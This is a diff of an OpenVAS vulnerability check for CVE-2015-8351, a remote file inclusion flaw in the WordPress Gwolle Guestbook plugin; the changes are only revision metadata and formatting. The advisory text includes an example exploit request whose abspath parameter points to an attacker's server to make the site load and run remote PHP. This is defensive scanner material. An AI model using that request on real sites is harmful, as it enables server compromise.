@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_gwolle_gb_rfi_vuln.nasl 7243 2017-09-25 05:48:36Z cfischer $
+# $Id: gb_wordpress_gwolle_gb_rfi_vuln.nasl 11816 2018-10-10 10:42:56Z mmartin $
 #
 # WordPress Gwolle Guestbook Plugin Remote File Inclusion Vulnerability
 #
@@ -30,16 +30,16 @@ CPE = "cpe:/a:wordpress:wordpress";
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.112042");
-  script_version("$Revision: 7243 $");
-  script_tag(name: "last_modification", value: "$Date: 2017-09-25 07:48:36 +0200 (Mon, 25 Sep 2017) $");
-  script_tag(name: "creation_date", value: "2017-09-12 11:05:31 +0200 (Tue, 12 Sep 2017)");
+  script_version("$Revision: 11816 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-10 12:42:56 +0200 (Wed, 10 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2017-09-12 11:05:31 +0200 (Tue, 12 Sep 2017)");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 
   script_cve_id("CVE-2015-8351");
 
-  script_tag(name: "qod_type", value: "remote_banner");
-  script_tag(name: "solution_type", value: "VendorFix");
+  script_tag(name:"qod_type", value:"remote_banner");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   script_name("WordPress Gwolle Guestbook Plugin Remote File Inclusion Vulnerability");
 
@@ -50,26 +50,26 @@ if (description)
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_mandatory_keys("wordpress/installed");
 
-  script_tag(name: "summary", value: "PHP remote file inclusion vulnerability in the Gwolle Guestbook plugin for WordPress,
+  script_tag(name:"summary", value:"PHP remote file inclusion vulnerability in the Gwolle Guestbook plugin for WordPress,
       when allow_url_include is enabled, allows remote authenticated users to execute arbitrary PHP code via a URL in the abspath parameter
       to frontend/captcha/ajaxresponse.php.
 
       NOTE: this can also be leveraged to include and execute arbitrary local files via directory traversal sequences regardless of whether allow_url_include is enabled.");
-  script_tag(name: "insight", value: "HTTP GET parameter 'abspath' is not being properly sanitized before being used in PHP require() function.
+  script_tag(name:"insight", value:"HTTP GET parameter 'abspath' is not being properly sanitized before being used in PHP require() function.
       A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server.
       In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
 
       http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
 
       In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code.");
-  script_tag(name: "impact", value: "Successful exploitation of this vulnerability will lead to entire WordPress installation compromise,
+  script_tag(name:"impact", value:"Successful exploitation of this vulnerability will lead to entire WordPress installation compromise,
       and may even lead to the entire web server compromise.");
-  script_tag(name: "vuldetect", value: "Checks the version.");
-  script_tag(name: "affected", value: "WordPress Gwolle Guestbook plugin before 1.5.4.");
-  script_tag(name: "solution", value: "Update to version 1.5.4 or later.");
+  script_tag(name:"vuldetect", value:"Checks the version.");
+  script_tag(name:"affected", value:"WordPress Gwolle Guestbook plugin before 1.5.4.");
+  script_tag(name:"solution", value:"Update to version 1.5.4 or later.");
 
-  script_xref(name: "URL", value: "https://wordpress.org/plugins/gwollegb/#changelog");
-  script_xref(name: "URL", value: "https://packetstormsecurity.com/files/134599/WordPress-Gwolle-Guestbook-1.5.3-Remote-File-Inclusion.html");
+  script_xref(name:"URL", value:"https://wordpress.org/plugins/gwollegb/#changelog");
+  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/134599/WordPress-Gwolle-Guestbook-1.5.3-Remote-File-Inclusion.html");
 
   exit(0);
 }
